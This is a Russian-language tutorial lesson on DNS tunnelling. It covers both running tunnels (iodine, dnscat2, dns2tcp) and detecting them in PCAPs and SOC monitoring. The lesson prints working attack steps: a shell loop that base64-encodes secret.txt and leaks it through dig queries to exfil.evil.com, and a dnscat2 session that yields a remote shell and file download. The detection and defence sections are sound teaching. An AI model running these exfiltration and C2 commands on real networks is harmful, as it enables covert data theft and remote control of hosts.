DNS почти всегда разрешён наружу (иначе не работает интернет), поэтому это идеальный транспорт для скрытой передачи данных и C2. Данные кодируются в поддомены запросов и в ответы (TXT/NULL), а на стороне атакующего поднимается свой авторитативный сервер. Урок опирается на [`network-covert`](network-covert) и [`network-dns-attacks`](network-dns-attacks).

## Почему DNS подходит для туннеля

- Разрешён через периметр (**UDP/53**, часто и TCP/53 — для больших ответов и DNSSEC).
- Запросы обычно не инспектируются глубоко и не блокируются по содержимому.
- Иерархия домена позволяет направить запросы к **своему** серверу (`t.evil.com` делегируется на ваш NS).
- Резолверы кэшируют, но при правильной настройке (TTL=0, делегирование) запросы доходят до вас.

## Кодирование данных

- **Поддомены**: `<chunk>.t.evil.com` — данные в метке (base32/base64/hex).
- **Типы записей**: `A` (мало места, но кэшируется), `TXT`/`NULL` (произвольные данные), `CNAME`, `MX`, `SRV`.
- **Ответы**: сервер кодирует данные в ответных записях (команды C2 идут в ответах).
- **Ограничения**: метка ≤63 байта, полное имя ≤253; отсюда разбиение на фрагменты и нумерация.

```text
<seq><data>.tunnel.evil.com  A ?
# ответ: TXT "<data>"  (или A с закодированным значением)
```

Нумерация фрагментов (seq в начале метки) позволяет собирать данные по порядку, даже если ответы приходят не по порядку.

## Делегирование домена на ваш сервер

Чтобы iodine/dnscat2 работали, нужен домен, у которого NS-записи указывают на ваш сервер:

```bash
# В зоне example.com:
#   t     NS   ns1.attacker.com
#   ns1   A    <IP вашего сервера>
# На сервере — authoritative DNS (bind/nsd) на UDP/53
# Проверка делегирования:
dig +short NS t.example.com
dig +short A ns1.attacker.com
```

Без делегирования запросы уйдут на публичный резолвер и до вашего сервера не дойдут.

## iodine — полноценный IP-over-DNS

iodine создаёт **tun-интерфейс** и маршрутизирует весь IP через DNS. Требует авторитативного NS и TUN на обоих концах.

```bash
# Сервер (authoritative для t.example.com), IP туннеля 10.0.0.1
iodined -f -c -P secret 10.0.0.1 t.example.com
# Клиент
iodine -f -P secret t.example.com
# -> создаётся tun0, клиент получает 10.0.0.x
ip addr show tun0
ssh user@10.0.0.1          # трафик идёт поверх DNS
```

Ключи: `-f` (foreground), `-c` (не проверять клиентские IP), `-P` (пароль), `-m` (MTU), `-T` (тип записи A/NULL/TXT/SRV/MX/CNAME), `-O` (кодировка).

## dnscat2 — C2/шелл поверх DNS

dnscat2 даёт интерактивные сессии, файловую передачу и шелл — удобно для пост-эксплуатации.

```bash
# Сервер
ruby dnscat2.rb t.example.com --secret=secret
# Клиент (Linux/Windows)
./dnscat --secret=secret t.example.com
# В консоли сервера:
#   sessions            — список сессий
#   session -i 1        — войти
#   shell               — получить шелл
#   download secret.txt — скачать файл
```

Транспорты: `--dns` (по умолчанию), `--udp`, `--tcp`; типы записей TXT/CNAME/MX/A.

## dns2tcp — TCP-over-DNS

```bash
# Сервер: /etc/dns2tcpd.conf задаёт ресурсы (ssh, ...) и ключ
dns2tcpd -f /etc/dns2tcpd.conf -F -d 1
# Клиент: проброс локального порта на удалённый ресурс
dns2tcpc -z t.example.com <server_ip>
#   > ssh
#   -> listening on 127.0.0.1:2222
ssh -p 2222 user@127.0.0.1
```

## Разобранный пример: эксфильтрация файла через DNS

```bash
# 1. Готовим данные и режем на куски
base64 secret.txt | fold -w 40 > chunks.txt
# 2. Отправляем кусками как поддомены (PoC)
i=0
while read c; do
  dig +short "$i-$c.exfil.evil.com" A >/dev/null
  i=$((i+1))
done < chunks.txt
# 3. На авторитативном сервере собираем запросы из лога
#    (bind querylog / свой collector), восстанавливаем base64 по seq
# 4. Декодируем
base64 -d received.txt > secret.txt
file secret.txt
# 5. Для интерактива — iodine (tun) или dnscat2 (шелл)
```

Для ускорения можно использовать один запрос на несколько меток (несколько поддоменов) и параллельные резолверы, но растёт заметность.

## Извлечение из PCAP (когда вы аналитик)

```bash
# 1. Убедиться, что это DNS-туннель
tshark -r t.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name | head -30
# 2. Длина меток и частота (энтропия растёт)
tshark -r t.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name | \
  awk -F. '{print length($1)}' | sort -n | uniq -c | tail
# 3. Топ родительских доменов
tshark -r t.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name | \
  awk -F. '{print $(NF-1)"."$NF}' | sort | uniq -c | sort -rn | head
# 4. Собрать поддомены одного родителя в порядке времени
tshark -r t.pcap -Y 'dns.flags.response==0' -T fields -e frame.time_epoch -e dns.qry.name | \
  sort -n | awk '{print $2}' | grep '\.exfil\.evil\.com$' | cut -d. -f1 > c.txt
# 5. Декодировать (base32/base64/hex по вкусу авторов)
while read x; do echo "$x" | base64 -d 2>/dev/null; done < c.txt > out.bin
file out.bin; strings out.bin | grep -iE 'flag|PK|%PDF'
# 6. Данные в ответах (TXT)
tshark -r t.pcap -Y 'dns.flags.response==1 and dns.resp.type==16' -T fields -e dns.txt | head
```

## Детект (для SOC)

- **Длина и энтропия меток**: длинные случайные поддомены (base32/base64) — красный флаг.
- **Всплеск TXT/NULL-запросов** и запросов к одному домену.
- **Много уникальных поддоменов** под одним родителем за короткое время.
- **NXDOMAIN-шторм** (если туннель бьётся о резолвер).
- **Объём**: DNS обычно «лёгкий»; туннель генерирует аномальный трафик.
- **Периодичность** запросов (beaconing C2).

## Ложные срабатывания

Не всякий «странный DNS» — туннель:

- CDN/телеметрия с длинными поддоменами.
- Anti-virus/EDR-домены с хэшами.
- DGA-малварь (похоже, но без коррелированных ответов — NXDOMAIN).
- Сервисы аналитики с base64-идентификаторами.

Отличие туннеля: **устойчивый** объём, ответы сервера, коррелированные с запросами, часто к **одному** домену.

## Защита

- Ограничить **исходящий DNS** корпоративными резолверами (не пускать напрямую к произвольным серверам на 53).
- **RPZ/блок-листы** известных туннельных доменов; **Response Rate Limiting**.
- **ML-аналитика** запросов (длина/энтропия/частота/уникальность).
- Ограничение длины запросов и частоты на резолвере.
- **Sinkhole** подозрительных доменов и наблюдение за клиентами.
- Мониторинг NXDOMAIN и корреляции запрос/ответ.

## Частые ошибки

- **Думать, что DNS «слишком мал»** — за счёт частоты пропускная способность растёт.
- **Игнорировать TCP/53** — туннель может идти и по TCP.
- **Не настраивать authoritative-сервер** — iodine/dnscat2 требуют делегирования.
- **Смотреть только A-запросы** — TXT/NULL несут основные данные.
- **Забывать про NXDOMAIN** — признак сломанного/фильтруемого туннеля.
- **Не считать энтропию** — закодированные метки выделяются на фоне обычных.
- **Не смотреть ответы** — данные и команды C2 идут в обе стороны.

## Сравнение инструментов

| Инструмент | Модель | Пропускная способность | Заметность |
|------------|--------|------------------------|-----------|
| iodine | IP-over-DNS (tun) | высокая | средняя |
| dnscat2 | C2/шелл | средняя | средняя |
| dns2tcp | TCP-over-DNS | средняя | средняя |
| ручной dig | эксфильтрация файлов | низкая | низкая |

## Что дальше / решение

- Нужен **IP-туннель** через DNS → iodine (tun-интерфейс, SSH наружу).
- Нужен **шелл/C2** → dnscat2 (сессии, файлы, шелл).
- Нужна **разовая эксфильтрация** → ручной base32/base64 через `dig` + свой collector.
- Анализ/детект → `network-pcap-analysis` (сбор поддоменов, энтропия) и RPZ/ML на резолверах.
- Смежные темы → `network-covert-timing` (данные в метаданных), `network-dns-attacks` (спуфинг/кэш).

Решение (алгоритм): 1) заделегировать поддомен на свой NS; 2) поднять сервер (iodined/dnscat2/dns2tcp); 3) выбрать кодировку и размер фрагмента; 4) поднять клиент; 5) проверить туннель; 6) при анализе — собрать поддомены, оценить энтропию, декодировать; 7) для защиты — egress-DNS через резолвер + ML/RPZ.

## Оптимизация пропускной способности

«Чистый» DNS-туннель медленный (десятки-сотни КБ/с максимум), поэтому на практике его ускоряют:

- **Несколько поддоменов в одном запросе** — данные в нескольких метках и в суффиксе.
- **Параллельные резолверы** — клиент шлёт запросы через несколько DNS-серверов одновременно.
- **Типы записей с большим ответом** — TXT/NULL вмещают больше, чем A.
- **Короткие TTL и без кэша** — чтобы запросы реально доходили до вашего NS.
- **Кодировка base32** без padding эффективнее по длине метки, чем base64 (нет `+`/`/`).
- **Сжатие перед кодированием** (gzip/zstd) — но растёт энтропия (заметность).

```bash
# Оценка пропускной способности iodine
iodine -f -P secret t.example.com --version
# Серверные ключи: -m (MTU туннеля), -T (тип записи), -O (кодек)
# Проверить скорость
iperf3 -c 10.0.0.1
```

Обратная сторона: чем быстрее и «плотнее» туннель, тем он заметнее по энтропии меток и объёму.

## Beaconing и C2-паттерны

dnscat2/малварь часто генерируют **периодические** запросы (check-in) — это классический beaconing:

- Ровные интервалы между запросами к одному домену.
- Фиксированный размер или структура метки.
- «Тихие» периоды (нет запросов) в неактивное время.
- Корреляция запрос/ответ (ответ всегда есть, в отличие от DGA/NXDOMAIN).

```bash
# Интервалы между DNS-запросами к одному домену
tshark -r t.pcap -Y 'dns.qry.name contains "t.example.com"' -T fields -e frame.time_relative | \
  awk 'NR>1{print $1-prev} {prev=$1}' | sort -n | uniq -c | tail
# Уникальные поддомены (высокая уникальность = данные)
tshark -r t.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name | sort -u | wc -l
```

## Быстрая шпаргалка аналитика

| Признак | Значение |
|---------|----------|
| Длинные случайные метки | кодированные данные (base32/base64) |
| Много уникальных поддоменов | эксфильтрация |
| Запросы к одному родителю | туннель/C2 |
| Ровные интервалы | beaconing |
| TXT/NULL-всплеск | данные в ответах |
| NXDOMAIN-шторм | сломанный/фильтруемый туннель |
| Запросы напрямую к внешнему NS | обход корпоративного резолвера |

## Различие туннеля и легитимного трафика

Ключ к детекту — **комбинация** признаков, а не один. CDN и телеметрия дают длинные поддомены, но без устойчивого объёма к **одному** домену и без коррелированных ответов. DGA даёт случайные имена, но без ответов (NXDOMAIN). Туннель же: один родитель + много уникальных поддоменов + стабильный объём + всегда есть ответы.
